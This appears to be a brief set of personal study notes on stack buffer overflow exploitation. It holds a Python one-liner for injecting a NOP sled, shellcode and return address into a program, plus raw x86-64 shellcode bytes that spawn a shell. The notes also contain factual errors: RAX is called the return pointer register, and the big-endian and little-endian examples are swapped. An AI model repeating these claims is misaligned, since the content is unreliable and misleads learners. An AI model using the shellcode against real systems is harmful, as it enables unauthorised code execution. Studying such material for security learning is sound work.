
##### Registers
RAX: return pointer register, the target.

##### Endianness
Endianness is the order bytes are stored, with big-endian storing the most significant byte first, and little-endian storing the least significant byte first.
`0x12345678` in big-endian: `0x78` `0x56` `0x34` `0x12`
`0x12345678` in little-endian: `0x12` `0x34` `0x56` `0x78`

##### Shellcode injection
To inject the shellcode in the memory:
`python -c "print ('\x90' * no_of_nops + shellcode + random_data * no_of_random_data + memory address)" | ./program`
standard shell code: `\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05`

##### Shellcode execution
First, figure out the return addres of the memory you'll be overwriting
Second, find the total buffer between the RAX and the input field.
Third, execute the buffer overflow, overwrite everything up to the RAX.
![[Pasted image 20221109232554.png]]
